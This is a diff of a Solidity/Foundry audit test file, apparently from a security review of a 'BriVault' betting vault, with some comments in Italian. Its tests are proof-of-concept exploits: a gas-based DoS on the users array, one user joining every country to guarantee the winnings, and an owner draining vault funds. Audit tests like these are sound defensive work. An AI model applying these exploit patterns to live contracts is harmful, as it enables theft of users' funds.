@@ -5,6 +5,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {BriVault} from "../src/briVault.sol";
 import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
 import {MockERC20} from "./MockErc20.t.sol";
+import {BriTechToken} from "../src/briTechToken.sol";
 
 
 contract BriVaultAuditTest is Test {
@@ -17,6 +18,7 @@ contract BriVaultAuditTest is Test {
     // Vault contract
     BriVault public briVault;
     MockERC20 public mockToken;
+    BriTechToken public briTechToken;
 
     // Users
     address attacker = makeAddr("attacker");
@@ -72,6 +74,7 @@ contract BriVaultAuditTest is Test {
           vm.stopPrank();
     }
 
+//---------------SENT-----------------------
     function testDOSAttackOnUsersAddressArray() public {
         uint256 depositAmount = 1 ether;
         vm.startPrank(attacker);
@@ -88,9 +91,7 @@ contract BriVaultAuditTest is Test {
         vm.startPrank(owner);
         uint256 gasLimit = 30_000_000;
         uint256 gasBefore = gasleft();
-        //using call with gas limit to simulate mainnet gas limit
-        (bool success,) = address(briVault).call{gas: gasLimit}
-            (abi.encodeWithSignature("setWinner(uint256)",0)); 
+        briVault.setWinner(0); 
         uint256 gasUsed = gasBefore - gasleft();
         
         vm.stopPrank();
@@ -101,7 +102,36 @@ contract BriVaultAuditTest is Test {
     function testUserCanJoinEventMultipleTimesJoiningEveryCountryId() public {
         //l' user può joinare più volte l'evento scegliendo ogni volta un countryId differente
         //assicurandosi sempre la vittoria
-        uint256 depositAmount = mockToken.balanceOf(user1);
+        uint256 victimDepositAmount = 1 ether;
+        uint256 expectedVictimShares = briVault.convertToShares(victimDepositAmount) * 
+            (10000 - participationFeeBsp) / 10000;
+        vm.startPrank(user2);
+        mockToken.approve(address(briVault), victimDepositAmount);
+        briVault.deposit(victimDepositAmount, user2);
+        briVault.joinEvent(2); 
+        vm.stopPrank();
+
+        vm.startPrank(user4);
+        mockToken.approve(address(briVault), victimDepositAmount);
+        briVault.deposit(victimDepositAmount, user4);
+        briVault.joinEvent(4); 
+        vm.stopPrank();
+
+        vm.startPrank(user3);
+        mockToken.approve(address(briVault), victimDepositAmount);
+        briVault.deposit(victimDepositAmount, user3);
+        briVault.joinEvent(3); 
+        vm.stopPrank();
+        
+        vm.startPrank(user5);
+        mockToken.approve(address(briVault), victimDepositAmount);
+        briVault.deposit(victimDepositAmount, user5);
+        briVault.joinEvent(47); 
+        vm.stopPrank();
+
+        uint256 winnerInitBalance = mockToken.balanceOf(user1);
+        uint256 depositAmount = mockToken.balanceOf(user1); //20eth
+        uint256 expectedShares = briVault.convertToShares(depositAmount) * (10000 - participationFeeBsp) / 10000;
         vm.startPrank(user1);
         mockToken.approve(address(briVault), depositAmount);
         briVault.deposit(depositAmount, user1);   
@@ -109,13 +139,25 @@ contract BriVaultAuditTest is Test {
             briVault.joinEvent(i); // joining with every countryId
         }
         vm.stopPrank();
-
         // user1 should have shares for every countryId joined
         for(uint256 i = 0; i < 48; i++) {
             uint256 shares = briVault.userSharesToCountry(user1, i);
-            assertGt(shares, 0);
+            assertEq(shares, expectedShares);
         }
 
+        uint256 expectedTotalShares = (expectedVictimShares * 4) + expectedShares;
+        assertEq(expectedTotalShares, briVault.totalSupply());
+
+        vm.warp(briVault.eventEndDate() + 1);
+
+        vm.prank(owner);
+        briVault.setWinner(47);
+        uint256 finalizedVaultAsset = mockToken.balanceOf(address(briVault));
+        vm.prank(user1);
+        briVault.withdraw();
+        uint256 winnerFinalBalance = mockToken.balanceOf(user1);
+        uint256 expectedWin = (expectedShares * finalizedVaultAsset) / expectedShares;
+        assertEq(expectedWin, winnerFinalBalance - winnerInitBalance);
     }
 
     function testDepositSendSharesToWrongAddress() public {
@@ -152,19 +194,18 @@ contract BriVaultAuditTest is Test {
         vm.startPrank(user2);
         mockToken.approve(address(briVault), depositAmount);
         briVault.deposit(depositAmount, user2);   
-        briVault.joinEvent(2); // joining with countryId 3
+        briVault.joinEvent(3); // joining with countryId 3
         vm.stopPrank();
 
         vm.startPrank(owner);
-        mockToken.approve(address(briVault), depositAmount);
-        briVault.deposit(depositAmount, owner);   
+        uint256 ownerBalanceBeforeDeposit = mockToken.balanceOf(owner);
+        mockToken.approve(address(briVault), ownerBalanceBeforeDeposit);
+        briVault.deposit(ownerBalanceBeforeDeposit, owner);   
         briVault.joinEvent(1); // joining with countryId 1
         vm.warp(briVault.eventEndDate() +1);
         briVault.setWinner(1); // setting winner to countryId 1
         vm.stopPrank();
-        uint256 initialOwnerBalance = mockToken.balanceOf(owner);
-        console.log("owner initial balance: ", initialOwnerBalance);
-
+        
         // total vault assets
         uint256 totalVaultAsset = mockToken.balanceOf(address(briVault));
         console.log("vault token balance: ", totalVaultAsset);
@@ -176,8 +217,9 @@ contract BriVaultAuditTest is Test {
 
         uint256 ownerFinalBalance = mockToken.balanceOf(owner);
         console.log("owner final balance: ", ownerFinalBalance);
-        assertEq(ownerFinalBalance, initialOwnerBalance + totalVaultAsset); // owner should receive all vault assets
-
+        // owner should receive all vault assets
+        // owner deposited full balance so initial balance is 0
+        assertEq(ownerFinalBalance, totalVaultAsset); 
     }
 
     function testOwnerCanSetCountryAfterUsersStartedEnteringTheGame() public {
@@ -264,5 +306,9 @@ contract BriVaultAuditTest is Test {
         //check shares effettive siano  giuste
         //check totalPartecipantShares è sbagliato
     }
+
+
+    //DISABILITARE TRANSFER. DOPO CHE OWNER SET WINNER, CHI HA PERSO POTREBBE INVIARE SAHRES AL VINCITORE
+    //CHE AVREBBE PIù SHARES DA DILUIRE NELLA VINCITA FINALE
     
 }
